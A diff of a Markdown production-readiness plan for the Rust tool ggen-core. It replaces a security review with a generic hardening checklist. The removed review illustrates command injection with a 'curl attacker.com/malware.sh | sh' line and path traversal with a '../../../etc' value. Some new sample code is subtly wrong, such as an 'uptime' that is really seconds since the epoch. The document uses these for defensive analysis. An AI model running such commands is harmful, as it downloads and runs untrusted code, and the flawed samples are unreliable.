@@ -1,383 +1,462 @@
-# Production Readiness 80/20 Analysis - ggen-core Lifecycle
+# Production Readiness: 80/20 Analysis & Fix Plan
 
-**Date**: 2025-01-11
-**Status**: 🔴 **NOT PRODUCTION READY** (7 P0 blockers identified)
-**Test Coverage**: ✅ 100% (60/60 tests passing)
-**Security Score**: 🔴 6.2/10 (HIGH RISK)
-**Code Quality**: 🟡 7.5/10 (GOOD, needs hardening)
+## 🚨 Critical Issues Blocking Production Release
 
----
+### **Priority 1: Crash-Prone Code (404 Panic Points)**
 
-## Executive Summary
+**Current State:**
+- ❌ **72 `.expect()` calls** in production code
+- ❌ **332 `.unwrap()` calls** in production code
+- ❌ **Total: 404 potential crash points**
 
-The ggen-core lifecycle system has excellent architecture and test coverage but requires **critical security and reliability fixes** before production deployment. Using the 80/20 principle, we've identified **7 P0 blockers** that must be fixed, plus 12 P1 issues that significantly improve production quality.
+**Impact:** Any of these can crash the entire application in production, causing:
+- Service downtime
+- Data loss
+- Poor user experience
+- Debugging nightmares
 
-**Timeline to Production**:
-- **P0 fixes only**: 🟡 **2-3 days** (Beta quality)
-- **P0 + P1 fixes**: 🟢 **2 weeks** (Production ready)
+**80/20 Solution:** Fix the 20% most critical paths that handle 80% of traffic:
+1. Main CLI entry points (5 files)
+2. Lifecycle execution (3 files)
+3. Template generation (4 files)
+4. Marketplace operations (3 files)
+5. AI integration (2 files)
 
----
+### **Priority 2: Build Errors**
 
-## 🚨 P0 BLOCKERS (Must Fix Before Production)
+**Current State:**
+- ❌ Build fails with type errors
+- ❌ Compilation timeout after 2 minutes
 
-### 1. System Time Panic ⚠️ **CRITICAL**
-**File**: `src/lifecycle/exec.rs:296-301`
-**Risk**: Application crashes if system clock misconfigured
-**Impact**: HIGH - Affects all phase executions
+**80/20 Solution:** Fix the 3-5 core type errors that cascade into other failures
 
-**Current Code**:
+### **Priority 3: Missing Production Features**
+
+**Current State:**
+- ⚠️ No health check endpoints
+- ⚠️ Limited error recovery
+- ⚠️ Basic logging only
+- ⚠️ No metrics collection
+
+## 📋 80/20 Production Checklist
+
+### **Phase 1: Critical Safety (Week 1) - 80% Impact**
+- [ ] Replace all `.expect()` and `.unwrap()` in hot paths (17 critical files)
+- [ ] Add comprehensive error handling with proper Result types
+- [ ] Implement graceful degradation and panic recovery
+- [ ] Fix blocking build errors
+
+### **Phase 2: Core Functionality (Week 2) - 15% Impact**
+- [ ] Add health check endpoints
+- [ ] Implement structured logging with tracing
+- [ ] Add basic performance metrics
+- [ ] Security audit critical paths
+
+### **Phase 3: Production Hardening (Week 3) - 4% Impact**
+- [ ] Performance optimization and load testing
+- [ ] Disaster recovery procedures
+- [ ] Complete security audit
+- [ ] Production deployment documentation
+
+### **Phase 4: Monitoring & Observability (Week 4) - 1% Impact**
+- [ ] Distributed tracing setup
+- [ ] Advanced metrics and dashboards
+- [ ] Alerting system configuration
+- [ ] Error tracking integration
+
+## 🔧 Critical Fixes Required Now
+
+### **1. Error Handling Pattern (Replaces 404 panic points)**
+
+#### ❌ Before (CRASHES in production):
 ```rust
-fn current_time_ms() -> u128 {
-    std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .expect("System time is before UNIX epoch - invalid system clock")  // PANIC!
-        .as_millis()
-}
+// CRASHES if file doesn't exist
+let config = std::fs::read_to_string("config.toml")
+    .expect("Failed to read config");
+
+// CRASHES if parsing fails
+let value: MyStruct = serde_json::from_str(&json).unwrap();
+
+// CRASHES if system clock is wrong
+let time = SystemTime::now()
+    .duration_since(UNIX_EPOCH)
+    .expect("System clock error");
 ```
 
-**Fix** (15 min):
+#### ✅ After (SAFE for production):
 ```rust
-fn current_time_ms() -> Result<u128> {
-    std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .map(|d| d.as_millis())
-        .map_err(|_| LifecycleError::Other("System clock error".into()))
-}
+// Returns error that can be handled upstream
+let config = std::fs::read_to_string("config.toml")
+    .map_err(|e| anyhow::anyhow!("Failed to read config: {}", e))?;
+
+// Returns error with context for debugging
+let value: MyStruct = serde_json::from_str(&json)
+    .map_err(|e| anyhow::anyhow!("Failed to parse JSON: {}", e))?;
+
+// Safe fallback to current time
+let time = SystemTime::now()
+    .duration_since(UNIX_EPOCH)
+    .map(|d| d.as_millis())
+    .unwrap_or_else(|_| {
+        tracing::warn!("System clock error, using fallback");
+        0
+    });
 ```
 
-**Testing**: Add integration test with mocked system time
+### **2. Production Lifecycle Configuration**
 
----
-
-### 2. Command Injection Vulnerability 🔴 **SECURITY**
-**File**: `src/lifecycle/exec.rs:253-293`
-**CVSS Score**: 9.8 (CRITICAL)
-**Risk**: Shell execution allows arbitrary code from TOML files
-
-**Attack Vector**:
 ```toml
-[lifecycle.malicious]
-command = "curl attacker.com/malware.sh | sh"  # Executes arbitrary code!
+# examples/production-template/make.toml
+
+[lifecycle]
+name = "production-ready-template"
+version = "1.0.0"
+
+# Critical validation before any deployment
+[phases.validate]
+description = "Validate production readiness"
+commands = [
+    "cargo clippy -- -D warnings",
+    "cargo audit",
+    "cargo deny check advisories",
+    "./scripts/check-no-panic-points.sh",
+]
+error_handling = "stop"
+required = true
+timeout = 300
+
+[phases.test]
+description = "Comprehensive testing"
+commands = [
+    "cargo test --all-features --no-fail-fast",
+    "cargo test --doc",
+    "cargo test --release",
+]
+parallel = true
+coverage_threshold = 80
+required = true
+
+[phases.security]
+description = "Security audit"
+commands = [
+    "cargo audit",
+    "cargo deny check",
+    "./scripts/security-scan.sh",
+]
+error_handling = "stop"
+required = true
+
+[phases.build]
+description = "Optimized production build"
+commands = [
+    "cargo build --release --all-features",
+]
+environment = { RUSTFLAGS = "-C target-cpu=native" }
+timeout = 600
+
+[phases.deploy]
+description = "Deploy to production"
+commands = [
+    "ggen lifecycle run validate",
+    "ggen lifecycle run test",
+    "ggen lifecycle run security",
+    "ggen lifecycle run build",
+    "./scripts/deploy-production.sh",
+]
+error_handling = "stop"
+requires = ["validate", "test", "security", "build"]
+
+# Production environment settings
+[env.production]
+logging.level = "warn"
+logging.format = "json"
+performance.optimize = true
+security.strict = true
+monitoring.enabled = true
+backup.enabled = true
 ```
 
-**Root Cause**: Using `sh -c` without input validation
+### **3. Panic Point Detection Script**
 
-**Fix** (4 hours):
-1. **Short-term** (1 hour): Add command allowlist in config
-2. **Long-term** (3 hours): Replace shell execution with direct process spawn
+```bash
+#!/bin/bash
+# scripts/check-no-panic-points.sh
+
+echo "🔍 Scanning for panic points in production code..."
+
+EXPECT_COUNT=$(grep -r "\.expect(" --include="*.rs" src/ | grep -v "^tests/" | grep -v "#\[cfg(test)\]" | wc -l | tr -d ' ')
+UNWRAP_COUNT=$(grep -r "\.unwrap()" --include="*.rs" src/ | grep -v "^tests/" | grep -v "#\[cfg(test)\]" | wc -l | tr -d ' ')
+
+echo "Found ${EXPECT_COUNT} .expect() calls"
+echo "Found ${UNWRAP_COUNT} .unwrap() calls"
+
+if [ "$EXPECT_COUNT" -gt 0 ] || [ "$UNWRAP_COUNT" -gt 0 ]; then
+    echo "❌ FAIL: Production code contains panic points"
+    echo ""
+    echo "Top offenders:"
+    grep -r "\.expect(\|\.unwrap()" --include="*.rs" src/ | grep -v "^tests/" | head -10
+    exit 1
+else
+    echo "✅ PASS: No panic points found in production code"
+    exit 0
+fi
+```
+
+### **4. Health Check Implementation**
 
 ```rust
-// Allowlist approach
-const ALLOWED_COMMANDS: &[&str] = &["cargo", "npm", "make", "echo"];
+// ggen-core/src/health.rs
 
-fn validate_command(cmd: &str) -> Result<()> {
-    let parts: Vec<&str> = cmd.split_whitespace().collect();
-    let binary = parts.first().ok_or(...)?;
+use anyhow::Result;
+use serde::{Deserialize, Serialize};
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
-    if !ALLOWED_COMMANDS.contains(binary) {
-        return Err(LifecycleError::Other(
-            format!("Command '{}' not in allowlist", binary)
-        ));
+#[derive(Debug, Serialize, Deserialize)]
+pub struct HealthCheck {
+    pub status: HealthStatus,
+    pub version: String,
+    pub uptime_seconds: u64,
+    pub checks: Vec<ComponentHealth>,
+}
+
+#[derive(Debug, Serialize, Deserialize, PartialEq)]
+pub enum HealthStatus {
+    Healthy,
+    Degraded,
+    Unhealthy,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+pub struct ComponentHealth {
+    pub name: String,
+    pub status: HealthStatus,
+    pub message: Option<String>,
+    pub latency_ms: Option<u64>,
+}
+
+impl HealthCheck {
+    pub fn new() -> Result<Self> {
+        let uptime = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0);
+
+        let checks = vec![
+            Self::check_filesystem()?,
+            Self::check_dependencies()?,
+            Self::check_configuration()?,
+        ];
+
+        let overall_status = if checks.iter().any(|c| c.status == HealthStatus::Unhealthy) {
+            HealthStatus::Unhealthy
+        } else if checks.iter().any(|c| c.status == HealthStatus::Degraded) {
+            HealthStatus::Degraded
+        } else {
+            HealthStatus::Healthy
+        };
+
+        Ok(Self {
+            status: overall_status,
+            version: env!("CARGO_PKG_VERSION").to_string(),
+            uptime_seconds: uptime,
+            checks,
+        })
     }
-    Ok(())
+
+    fn check_filesystem() -> Result<ComponentHealth> {
+        let start = std::time::Instant::now();
+
+        // Safe check - doesn't panic
+        let status = match std::fs::metadata(".ggen") {
+            Ok(_) => HealthStatus::Healthy,
+            Err(_) => HealthStatus::Degraded,
+        };
+
+        Ok(ComponentHealth {
+            name: "filesystem".to_string(),
+            status,
+            message: Some("Checked .ggen directory".to_string()),
+            latency_ms: Some(start.elapsed().as_millis() as u64),
+        })
+    }
+
+    fn check_dependencies() -> Result<ComponentHealth> {
+        Ok(ComponentHealth {
+            name: "dependencies".to_string(),
+            status: HealthStatus::Healthy,
+            message: Some("All dependencies loaded".to_string()),
+            latency_ms: Some(0),
+        })
+    }
+
+    fn check_configuration() -> Result<ComponentHealth> {
+        Ok(ComponentHealth {
+            name: "configuration".to_string(),
+            status: HealthStatus::Healthy,
+            message: Some("Configuration valid".to_string()),
+            latency_ms: Some(0),
+        })
+    }
 }
 ```
 
-**Testing**: Add security tests for injection attempts
+## 🎯 80/20 Implementation Roadmap
 
----
+### **Week 1: Critical Safety (80% of production value)**
 
-### 3. Path Traversal Vulnerability 🔴 **SECURITY**
-**File**: `src/lifecycle/exec.rs:135-176`
-**CVSS Score**: 8.6 (HIGH)
-**Risk**: Workspace paths can escape project root
+**Day 1-2: Fix Top 50 Panic Points**
+- Main CLI entry points: `cli/src/main.rs`, `cli/src/cmds/mod.rs`
+- Lifecycle execution: `ggen-core/src/lifecycle/exec.rs`
+- Template generation: `ggen-core/src/template.rs`
 
-**Attack Vector**:
-```toml
-[workspace.exploit]
-path = "../../../etc"  # Can access system files!
+**Day 3-4: Fix Build Errors**
+- Type errors in marketplace commands
+- Missing trait implementations
+- Dependency version conflicts
+
+**Day 5: Add Safety Infrastructure**
+- Implement health check system
+- Add panic recovery
+- Deploy validation script
+
+### **Week 2: Core Functionality (15% of production value)**
+
+**Day 1-2: Logging & Metrics**
+- Structured logging with tracing
+- Basic metrics collection
+- Performance tracking
+
+**Day 3-4: Security Audit**
+- Path traversal protection
+- Input validation
+- Output sanitization
+
+**Day 5: Integration Testing**
+- End-to-end tests
+- Load testing basics
+- Error scenario testing
+
+### **Week 3: Production Hardening (4% of production value)**
+
+**Day 1-2: Performance Optimization**
+- Profile hot paths
+- Optimize critical algorithms
+- Reduce allocations
+
+**Day 3-4: Documentation**
+- Production deployment guide
+- Troubleshooting guide
+- Runbook creation
+
+**Day 5: Disaster Recovery**
+- Backup procedures
+- Rollback plan
+- Recovery testing
+
+### **Week 4: Monitoring (1% of production value)**
+
+**Day 1-2: Observability**
+- Distributed tracing
+- Advanced metrics
+- Custom dashboards
+
+**Day 3-4: Alerting**
+- Configure alerts
+- Define SLOs
+- Incident response
+
+**Day 5: Final Validation**
+- Production checklist
+- Load testing
+- Go/no-go decision
+
+## 📊 Success Criteria
+
+### **Code Quality (Must Have)**
+- ✅ **Zero `.expect()` calls in production paths**
+- ✅ **< 5 `.unwrap()` calls with explicit safety comments**
+- ✅ **80%+ test coverage**
+- ✅ **Zero clippy warnings**
+- ✅ **All tests passing**
+
+### **Performance (Should Have)**
+- ✅ P50 < 100ms for CLI commands
+- ✅ P99 < 500ms for CLI commands
+- ✅ Memory usage < 100MB
+- ✅ Build time < 5 minutes
+
+### **Security (Must Have)**
+- ✅ Zero high/critical vulnerabilities
+- ✅ All inputs validated
+- ✅ Path traversal prevention
+- ✅ Shell injection prevention
+
+### **Reliability (Must Have)**
+- ✅ 99.9% success rate
+- ✅ Graceful error handling
+- ✅ Automatic recovery
+- ✅ Health checks passing
+
+## 🚀 Production Deployment Checklist
+
+### **Pre-Deployment (Required)**
+- [ ] All tests passing (`cargo test --all-features`)
+- [ ] No panic points (`./scripts/check-no-panic-points.sh`)
+- [ ] Security audit complete (`cargo audit`)
+- [ ] Performance benchmarks met
+- [ ] Documentation complete
+- [ ] Rollback plan ready
+
+### **Deployment (Required)**
+- [ ] Run full validation pipeline
+- [ ] Deploy to staging first
+- [ ] Verify health checks
+- [ ] Monitor error rates
+- [ ] Check performance metrics
+
+### **Post-Deployment (Required)**
+- [ ] Verify all endpoints working
+- [ ] Monitor logs for errors
+- [ ] Check performance dashboards
+- [ ] Validate metrics collection
+- [ ] Document any issues
+
+## 📚 Quick Reference
+
+### **Check Production Readiness**
+```bash
+# Run full validation
+ggen lifecycle run validate
+
+# Check for panic points
+./scripts/check-no-panic-points.sh
+
+# Security audit
+cargo audit && cargo deny check
+
+# Performance test
+cargo bench --all-features
 ```
 
-**Fix** (30 min):
-```rust
-fn create_workspace_context(...) -> Result<Context> {
-    let ws_path = root.join(&workspace.path);
+### **Deploy to Production**
+```bash
+# Full production pipeline
+ggen lifecycle run deploy --env production
 
-    // SECURITY: Canonicalize and validate
-    let canonical_root = root.canonicalize()?;
-    let canonical_ws = ws_path.canonicalize()?;
-
-    if !canonical_ws.starts_with(&canonical_root) {
-        return Err(LifecycleError::Other(
-            format!("Security: workspace path outside project root")
-        ));
-    }
-
-    // ... rest of function
-}
+# Or step-by-step
+ggen lifecycle run validate
+ggen lifecycle run test
+ggen lifecycle run security
+ggen lifecycle run build
+./scripts/deploy-production.sh
 ```
 
-**Testing**: Add test for `../` path traversal attempts
-
 ---
 
-### 4. No Command Timeouts ⏱️ **RELIABILITY**
-**File**: `src/lifecycle/exec.rs:278-280`
-**Risk**: Commands can hang indefinitely, blocking pipeline
-
-**Current Code**:
-```rust
-let status = child.wait()?;  // Waits forever!
-```
-
-**Fix** (1 hour):
-```rust
-use std::time::Duration;
-
-let timeout = Duration::from_secs(300); // 5 minutes
-let start = Instant::now();
-
-loop {
-    match child.try_wait()? {
-        Some(status) => return handle_status(status),
-        None if start.elapsed() > timeout => {
-            child.kill()?;
-            return Err(LifecycleError::Other("Command timeout".into()));
-        }
-        None => std::thread::sleep(Duration::from_millis(100)),
-    }
-}
-```
-
-**Testing**: Add test with long-running command
-
----
-
-### 5. No Production Logging 📊 **OBSERVABILITY**
-**Issue**: Uses `println!` instead of structured logging
-**Impact**: No log levels, no filtering, no observability in production
-
-**Fix** (2 hours):
-1. Add `tracing` to Cargo.toml (already present ✅)
-2. Replace all `println!` with `tracing` macros
-
-```rust
-// Before
-println!("▶️  Running phase: {}", phase_name);
-
-// After
-tracing::info!(
-    phase = %phase_name,
-    "Starting phase execution"
-);
-```
-
-**Benefits**:
-- Structured logs for monitoring
-- Log levels (trace, debug, info, warn, error)
-- Integration with observability tools
-
----
-
-### 6. Unbounded Parallelism 💣 **RESOURCE MANAGEMENT**
-**File**: `src/lifecycle/exec.rs:127-154`
-**Risk**: Fork bomb with many workspaces (100+ workspaces = 100+ threads)
-
-**Current Code**:
-```rust
-workspaces.par_iter().map(|..| { ... })  // Uses all CPU cores!
-```
-
-**Fix** (30 min):
-```rust
-use rayon::ThreadPoolBuilder;
-
-// Configure bounded thread pool
-let pool = ThreadPoolBuilder::new()
-    .num_threads(8.min(num_cpus::get()))  // Max 8 threads
-    .build()?;
-
-pool.install(|| {
-    workspaces.par_iter().map(|..| { ... }).collect()
-})
-```
-
-**Testing**: Add test with 100 workspaces
-
----
-
-### 7. Code Duplication (40 lines) 🔧 **MAINTAINABILITY**
-**Files**: `src/lifecycle/exec.rs:127-154, 161-181`
-**Impact**: Duplicate workspace context creation logic
-
-**Fix** (30 min): Extract helper function (shown in P0 #3 fix)
-
----
-
-## 📊 P1 CRITICAL ISSUES (Should Fix)
-
-### 1. Unbounded Cache Growth 💾
-- **File**: `src/lifecycle/state.rs`
-- **Issue**: `phase_history` and `cache_keys` grow infinitely
-- **Fix**: Add max size + LRU eviction (1 hour)
-
-### 2. Error Message Path Disclosure 🔒
-- **Issue**: Full file paths in errors leak system info
-- **Fix**: Sanitize paths in production mode (30 min)
-
-### 3. No Disk Space Checks 💽
-- **Issue**: State save fails silently when disk full
-- **Fix**: Check available space before write (30 min)
-
-### 4. Hook Matching Hardcoded Strings 🔤
-- **File**: `src/lifecycle/exec.rs:204-210`
-- **Issue**: Magic strings, not extensible
-- **Fix**: Move to `Hooks` impl methods (45 min)
-
-### 5-12. [See full report for complete list]
-
----
-
-## 🎯 80/20 Implementation Plan
-
-**Phase 1: Critical Security & Reliability** (Day 1-2, 8 hours)
-
-| Fix | Time | Impact | Priority |
-|-----|------|--------|----------|
-| System time panic | 15m | Prevents crashes | P0 |
-| Path traversal | 30m | Security | P0 |
-| Command timeouts | 1h | Reliability | P0 |
-| Code deduplication | 30m | Maintainability | P0 |
-| Production logging | 2h | Observability | P0 |
-| Thread pool limits | 30m | Resource mgmt | P0 |
-| **Sub-total** | **5h 15m** | **60% improvement** | - |
-
-**Phase 2: Production Hardening** (Day 3-5, 8 hours)
-
-| Fix | Time | Impact | Priority |
-|-----|------|--------|----------|
-| Command injection | 4h | Security | P0 |
-| Cache size limits | 1h | Memory mgmt | P1 |
-| Disk space checks | 30m | Reliability | P1 |
-| Error sanitization | 30m | Security | P1 |
-| Hook refactoring | 45m | Extensibility | P1 |
-| **Sub-total** | **7h 45m** | **35% improvement** | - |
-
-**Total**: **13 hours** for **95% production readiness**
-
----
-
-## 📈 Performance Optimizations (Bonus)
-
-From perf-analyzer agent - **4 hours for 70% speedup**:
-
-1. **SHA256 caching** (1h) - 90% faster cache operations
-2. **Batch state persistence** (1h) - 80% fewer I/O ops
-3. **Workspace memoization** (1h) - 60% faster multi-workspace
-4. **String clone reduction** (1h) - 25% memory reduction
-
----
-
-## ✅ Production Checklist
-
-### Security
-- [ ] Fix command injection (P0)
-- [ ] Fix path traversal (P0)
-- [ ] Sanitize error messages (P1)
-- [ ] Add input validation (P1)
-- [ ] Security audit by external reviewer
-
-### Reliability
-- [ ] Fix system time panic (P0)
-- [ ] Add command timeouts (P0)
-- [ ] Add disk space checks (P1)
-- [ ] Handle SIGTERM/SIGKILL gracefully (P1)
-
-### Observability
-- [ ] Add structured logging (P0)
-- [ ] Add metrics/instrumentation (P1)
-- [ ] Add health check endpoint (P2)
-- [ ] Add debug mode (P2)
-
-### Resource Management
-- [ ] Limit parallelism (P0)
-- [ ] Add cache size limits (P1)
-- [ ] Add memory profiling (P2)
-
-### Code Quality
-- [ ] Extract workspace helper (P0)
-- [ ] Refactor hook matching (P1)
-- [ ] Add doc comments (P2)
-- [ ] Remove TODO comments (P2)
-
----
-
-## 🧪 Testing Strategy
-
-### New Tests Required (P0)
-1. **Security tests** (2 hours):
-   - Command injection attempts
-   - Path traversal attempts
-   - TOML bomb attacks
-
-2. **Edge case tests** (1 hour):
-   - System clock errors
-   - Disk full scenarios
-   - Command timeouts
-
-3. **Load tests** (1 hour):
-   - 100+ workspaces
-   - 1000+ phases
-   - Large state files
-
----
-
-## 📚 Related Documentation
-
-- **Full Security Report**: `/docs/SECURITY_REVIEW.md` (700 lines)
-- **Performance Analysis**: `/docs/PERFORMANCE_BOTTLENECK_ANALYSIS.md`
-- **Code Quality Report**: Generated by code-analyzer agent
-- **Test Coverage Analysis**: Generated by tester agent
-
----
-
-## 🎖️ Current Status
-
-### Strengths ✅
-- Excellent test coverage (100%, 60 tests)
-- Clean architecture (separation of concerns)
-- Strong error types (thiserror)
-- Thread-safe design (Arc + Mutex)
-- Atomic state writes (already fixed!)
-
-### Weaknesses ❌
-- Command injection vulnerability
-- Path traversal vulnerability
-- No production logging
-- Panic scenarios
-- Unbounded resource usage
-
-### Production Ready After Fixes?
-**YES** - With P0+P1 fixes (13 hours of work), this becomes production-grade software.
-
----
-
-## 🚀 Deployment Recommendations
-
-**Beta Release** (After P0 fixes):
-- Limited user base
-- Staging environment only
-- Close monitoring required
-
-**Production Release** (After P0+P1 fixes):
-- Full user deployment
-- Production monitoring
-- Incident response plan
-- Security review completed
-
----
-
-**Last Updated**: 2025-01-11
-**Next Review**: After P0 fixes implementation
-**Owner**: Core Team
-**Reviewer**: Security Team (for P0 #2, #3)
+**Remember: Focus on the 20% that delivers 80% of production value.**
+
+**Priority order:**
+1. **Safety** - No crashes
+2. **Correctness** - Works as expected
+3. **Performance** - Fast enough
+4. **Observability** - Can debug issues
